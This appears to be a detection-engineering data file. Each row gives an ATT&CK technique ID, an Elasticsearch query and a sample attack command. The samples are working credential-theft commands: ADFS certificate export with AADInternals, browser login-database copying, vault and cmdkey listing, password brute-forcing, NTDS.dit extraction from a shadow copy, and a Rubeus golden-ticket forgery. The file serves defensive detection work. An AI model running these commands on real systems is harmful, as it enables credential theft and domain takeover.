T1552.004,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""wildcard"": {""CommandLine"": ""AADInternals*""}},
                        {""match_phrase"": {""CommandLine"": ""Export-AADIntADFSCertificates""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""match_phrase"": {""CommandLine"": ""Get-ChildItem""}},
                        {""match_phrase"": {""CommandLine"": ""Where-Object""}},
                        {""match_phrase"": {""CommandLine"": ""Write-Host""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","Import-Module AADInternals -Force; 
Export-AADIntADFSCertificates; 
Get-ChildItem | Where-Object {$_ -like ""ADFS*""}; 
Write-Host ""`nCertificates retrieved successfully""",2,
T1552.004,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""wildcard"": {""CommandLine"": ""*ActiveDirectory*""}},
                        {""wildcard"": {""CommandLine"": ""*AADInternals*""}},
                        {""match_phrase"": {""CommandLine"": ""Get-ADObject""}},
                        {""match_phrase"": {""CommandLine"": ""System.Management.Automation.PSCredential""}},
                        {""match_phrase"": {""CommandLine"": ""Get-AADIntADUserNTHash""}},
                        {""match_phrase"": {""CommandLine"": ""Export-AADIntADFSConfiguration""}},
                        {""wildcard"": {""CommandLine"": ""*ServiceSettingsData.PolicyStore.DkmSettings*""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""match_phrase"": {""CommandLine"": ""[System.DirectoryServices.DirectorySearcher]""}},
                        {""match_phrase"": {""CommandLine"": ""Export-AADIntADFSCertificates""}},
                        {""match_phrase"": {""CommandLine"": ""ConvertTo-SecureString""}},
                        {""match_phrase"": {""CommandLine"": ""Get-ChildItem""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","Import-Module ActiveDirectory -Force ; 
Import-Module AADInternals -Force | Out-Null; 
$dcServerName = (Get-ADDomainController).HostName; 
$svc = Get-ADObject -filter * -Properties objectguid,objectsid | Where-Object name -eq ""#{adfs_service_account_name}""; 
$PWord = ConvertTo-SecureString -String ""#{replication_password}"" -AsPlainText -Force; 
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList;
$hash = Get-AADIntADUserNTHash -ObjectGuid $svc.ObjectGuid -Credentials $Credential -Server $dcServerName -AsHex; 
$ADFSConfig = Export-AADIntADFSConfiguration -Hash $hash -SID $svc.Objectsid.Value -Server; $Configuration = [xml]$ADFSConfig; 
$group = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.Group; 
$container = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.ContainerName; 
$parent = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.ParentContainerDn; 
$base = ""LDAP://CN=$group,$container,$parent""; 
$ADSearch = [System.DirectoryServices.DirectorySearcher]::new([System.DirectoryServices.DirectoryEntry]::new($base)); $ADSearch.Filter = '(name=CryptoPolicy)'; 
$ADSearch.PropertiesToLoad.Clear(); 
$ADSearch.PropertiesToLoad.Add(""displayName"") | Out-Null; 
$aduser = $ADSearch.FindOne(); 
$keyObjectGuid = $ADUser.Properties[""displayName""] ; 
$ADSearch.PropertiesToLoad.Clear(); 
$ADSearch.PropertiesToLoad.Add(""thumbnailphoto"") | Out-Null; 
$ADSearch.Filter=""(l=$keyObjectGuid)""; 
$aduser=$ADSearch.FindOne() ; 
$key=[byte[]]$aduser.Properties[""thumbnailphoto""][0] ; 
Export-AADIntADFSCertificates -Configuration $ADFSConfig -Key $key; 
Get-ChildItem | Where-Object {$_ -like ""ADFS*""}; 
Write-Host ""`nCertificates retrieved successfully""",2,
T1555.003,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""match_phrase"": {""CommandLine"": ""Copy-Item""}},
                        {""match"": {""CommandLine"": ""Destination""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""match_phrase"":{""CommandLine"": ""Chrome\\User Data\\Default\\Login Data""}},
                        {""match_phrase"":{""CommandLine"": ""Opera Stable\\Login Data""}},
                        {""match_phrase"":{""CommandLine"": ""Firefox\\Profiles""}},
                        {""match_phrase"":{""CommandLine"": ""Microsoft\\Edge\\User Data\\Default""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","Copy-Item ""$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"" -Destination $env:temp; 
Copy-Item ""$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data For Account"" -Destination $env:temp

Copy-Item ""$env:APPDATA\Opera Software\Opera Stable\Login Data"" -Destination $env:temp

Copy-Item ""$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default"" -Destination $env:temp\Edge -Force -Recurse

Copy-Item ""$env:APPDATA\Mozilla\Firefox\Profiles\"" -Destination $env:temp -Force -Recurse",2,
T1555.004,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must_not"":[
                        {""match"": {""CommandLine"": ""/all""}}
                    ]
     }
    },
    {""bool"":{
     ""must"":[
                                        {""wildcard"":{""CommandLine"": ""vaultcmd*""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","vaultcmd /listcreds:""Windows Credentials""",2,
T1552.001,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""wildcard"": {""CommandLine"": ""type*""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""match_phrase"": {""CommandLine"": ""Panther\\unattend.xml""}},
                        {""match_phrase"": {""CommandLine"": ""Panther\\Unattend\\unattend.xml""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","type C:\Windows\Panther\unattend.xml 
&& type C:\Windows\Panther\Unattend\unattend.xml",2,
T1110.001,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""wildcard"": {""CommandLine"": ""System.DirectoryServices.Protocols*""}},
                        {""match_phrase"":{""CommandLine"": ""Get-Content -Path""}},
                        {""match"":{""CommandLine"": ""foreach""}},
                        {""match"":{""CommandLine"": ""try""}},
                        {""wildcard"":{""CommandLine"": ""*.bind""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""wildcard"": {""CommandLine"": ""*.txt""}},
                        {""match_phrase"": {""CommandLine"": ""Write-Host""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","if (""NTLM"".ToLower() -NotIn @(""ntlm"",""kerberos"")) {;
   Write-Host ""Only 'NTLM' and 'Kerberos' auth methods are supported"";
   exit 1; }; 
[System.Reflection.Assembly]::LoadWithPartialName(""System.DirectoryServices.Protocols"") | Out-Null; 
$di = new-object System.DirectoryServices.Protocols.LdapDirectoryIdentifier(""$env:UserDnsDomain"",389); $passwordList = Get-Content -Path 5cb955_passwords.txt; 
foreach ($password in $passwordList){;
   $credz = new-object System.Net.NetworkCredential(""$ENV:USERNAME"", $password, ""$env:UserDnsDomain"");
   $conn = new-object System.DirectoryServices.Protocols.LdapConnection($di, $credz, [System.DirectoryServices.Protocols.AuthType]::NTLM);
   try {;
     Write-Host "" [-] Attempting ${password} on account $ENV:USERNAME."";
     $conn.bind();
     Write-Host "" [!] $ENV:USERNAME:${password} are valid credentials!"";
   } catch {;
     Write-Host $_.Exception.Message;
   };
 };
 Write-Host ""End of bruteforce""",2,
T1110.001,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""match_phrase"": {""CommandLine"": ""net use""}},
                        {""wildcard"": {""CommandLine"": ""*IPC""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""wildcard"": {""CommandLine"": ""*.txt""}},
                        {""wildcard"": {""CommandLine"": ""FOR*""}},
                        {""wildcard"": {""CommandLine"": ""user*""}},
                        {""wildcard"": {""CommandLine"": ""echo*""}}
      ],
       ""minimum_should_match"": 2
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","echo Password1> passwords.txt 
&& echo 1q2w3e4r>> passwords.txt 
&& echo Password!>> passwords.txt 
&& echo Spring2022>> passwords.txt 
&& echo ChangeMe!>> passwords.txt 
&& @FOR /F ""delims="" %p in (passwords.txt) DO @net use %logonserver%\IPC$ /user:""%userdomain%\#{user}"" ""%p"" 1>NUL 2>&1 
&& @echo [*] #{user}:%p 
&& @net use /delete %logonserver%\IPC$ > NUL",2,
T1003.005,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                    {""match_phrase"": {""CommandLine"": ""cmdkey /list""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",cmdkey /list,2,
T1003.003,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                    {""match_phrase"": {""CommandLine"": ""C:\\Windows\\Temp""}},
                    {""match"": {""CommandLine"": ""copy""}},
                    {""wildcard"": {""CommandLine"": ""*NTDS.dit""}},
                    {""match_phrase"": {""CommandLine"": ""reg save""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","if not exist C:\Windows\Temp  ( call ) ELSE ( mkdir C:\Windows\Temp ) &&   
&&  copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\Windows\Temp\ntds.dit 
&& copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Windows\Temp\VSC_SYSTEM_HIVE 
&& reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM_HIVE",2（被45识别）,
T1558.001,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""match_phrase"": {""CommandLine"": ""rubeus.exe""}},
                        {""wildcard"": {""CommandLine"": ""*.txt""}},
                        {""match_phrase"": {""CommandLine"": ""klist purge""}},
                        {""match_phrase"": {""CommandLine"": ""Get-Content -Path""}},
                        {""match_phrase"": {""CommandLine"": ""ForEach-Object""}},
                        {""match_phrase"": {""CommandLine"": ""Out-File""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""wildcard"": {""CommandLine"": ""username*""}},
                        {""wildcard"": {""CommandLine"": ""logonserver*""}},
                        {""wildcard"": {""CommandLine"": ""userdnsdomain*""}},
                        {""match_phrase"": {""CommandLine"": ""Remove-Item""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","Remove-Item $env:TEMP\golden.bat -ErrorAction Ignore; 
Remove-Item $env:TEMP\golden.txt -ErrorAction Ignore; 
cmd.exe /c ""$Env:temp\rubeus.exe"" golden /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9 /ldap /user:$ENV:username /dc:$($ENV:logonserver.TrimStart('\') + ""."" + ""$ENV:userdnsdomain"") /printcmd /outfile:golden; 
$filename = (Get-ChildItem | ? {$_.Name.startswith(""golden_"")} | Sort-Object -Descending -Property LastWriteTime | select -First 1).Name;
@""; >%TEMP%\golden.txt 2>&1 (;
   echo Purge existing tickets and create golden ticket:;
   klist purge;
   cd %temp%;
   ""$Env:temp\rubeus.exe"" ptt /ticket:kirbifile;
   echo.;
   echo Requesting SYSVOL:;
   dir \\$($ENV:logonserver.TrimStart('\') + ""."" + ""$ENV:userdnsdomain"")\SYSVOL;   ;
   echo.;
   echo Tickets after requesting SYSVOL:;
   klist;
   echo.;
   echo End of Golden Ticket attack; );""
@ -Replace ""kirbifile"", $filename | Out-File -Encoding OEM $env:TEMP\golden.bat; 
echo ""foo"" | runas /netonly /user:fake ""$env:TEMP\golden.bat"" | Out-Null; 
do {;
   Start-Sleep 1;
   Get-Content -Path ""$env:TEMP\golden.txt"" -Wait | ForEach-Object {;
     if ($_ -match 'End of Golden Ticket attack') { break } ;
   };
} while ($false); 
Get-Content $env:TEMP\golden.txt; 
Remove-Item $env:TEMP\golden.bat -ErrorAction Ignore; 
Remove-Item $env:TEMP\golden.txt -ErrorAction Ignore",2,
